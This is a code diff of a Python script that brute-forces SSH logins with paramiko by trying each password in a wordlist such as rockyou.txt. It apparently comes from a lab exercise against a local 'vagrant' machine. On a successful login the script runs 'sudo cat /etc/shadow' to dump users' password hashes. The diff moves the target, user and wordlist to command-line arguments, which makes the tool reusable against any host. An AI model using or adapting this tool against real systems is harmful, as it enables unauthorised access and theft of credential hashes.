@@ -17,19 +17,19 @@ import paramiko
 ### FUNCTIONS ####
 
 def connect_ssh(host, username, pw, port=22):
-    print(f"[{username}@{host}] Trying password {pw}: ", end="")
-    sshConnection = paramiko.SSHClient()
-    sshConnection.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+    print(f"[{username}@{host}] Trying password '{pw}': ", end="")
+    ssushi = paramiko.SSHClient()
+    ssushi.set_missing_host_key_policy(paramiko.AutoAddPolicy)
     
     try:
       # Create the SSH connection with info: host, port, username, and password. 
-      sshConnection.connect(host, port, username, pw)
+      ssushi.connect(host, port, username, pw)
       # print useful information if connected!
       print("SUCCESS!")
-      return sshConnection
+      return ssushi
     
     except paramiko.AuthenticationException:
-      print("FAIL")
+      print("fail")
       return None
 
     except KeyboardInterrupt:
@@ -38,28 +38,29 @@ def connect_ssh(host, username, pw, port=22):
 
    
 
-# no functions
-
 #### MAIN ####
 
-ip = '172.24.24.4'
-user = 'vagrant'
+try:
+    ip = sys.argv[1]
+    user = sys.argv[2]
+    wordlist = sys.argv[3]
+except:# Exception as exc:
+    #print("exc=", exc)
+    print("Invalid arguments.\n" \
+          "Please provide 3 arguments for this script:\n" \
+          "Format: <ip> <username> <wordlist>\n\n" \
+          "Exiting...")
+    sys.exit()
 
-# sshConnection = paramiko.SSHClient()
-# sshConnection.set_missing_host_key_policy(paramiko.AutoAddPolicy)
-# tmp = sshConnection.connect(ip, 22, user, "vagrant")
-# print("vagrant: ", tmp)
-# tmp = sshConnection.connect(ip, 22, user, "abc")
-# print("abc: ", tmp)
-# input("STOP")
+#input(f'{user}@{ip} using {wordlist} for lookup')
 
 
-if len(sys.argv) > 1:
-  wordlist = sys.argv[1]
-else: 
-  wordlist = input('Enter the wordlist file ("/usr/share/wordlists/rockyou.txt" is default): ')
-  ### if nothing entered, use the default filename
-  wordlist = "/usr/share/wordlists/rockyou.txt" if (wordlist == "") else wordlist 
+# if len(sys.argv) > 1:
+#   wordlist = sys.argv[1]
+# else: 
+#   wordlist = input('Enter the wordlist file ("/usr/share/wordlists/rockyou.txt" is default): ')
+#   ### if nothing entered, use the default filename
+#   wordlist = "/usr/share/wordlists/rockyou.txt" if (wordlist == "") else wordlist 
 
 # menu loop
 while True:
@@ -85,19 +86,23 @@ while True:
       sys.exit()  # kill the script
     else:
       if op == 1:   # password iterator
-        print(f"Parsing {wordlist} as the wordlist file:")
+        print(f"Parsing {wordlist} as the wordlist file.")
         try:
             file = open(wordlist, "rt")
             for pw in file:   # iterate over each line/word in the wordlist
                ssh = connect_ssh(ip, user, pw.strip())
                if (ssh != None):
                   try:
-                      print("Dumping password hashes from /etc/shadow:")
-                      ssh_in, ssh_out, ssh_err = ssh.exec_command("sudo cat /etc/shadow")
+                      print("\nDUMPING USER PW HASHES FROM /etc/shadow:")
+                      ssh_in, ssh_out, ssh_err = ssh.exec_command('sudo cat /etc/shadow | grep -v -e "*" -e "!"')
                       print(ssh_out.read().decode("ASCII"))
+                      print("^^^ END OF HASHES ^^^")
+                  
                   except Exception as exc:
                       print(f"Error retrieving password hashes. Exception: {exc}")
-                  sys.exit()
+                  
+                  break
+                  sys.exit()  # exit script after finding the right password
 
                time.sleep(1)
         except FileNotFoundError: print(f"File {wordlist} does not exist")
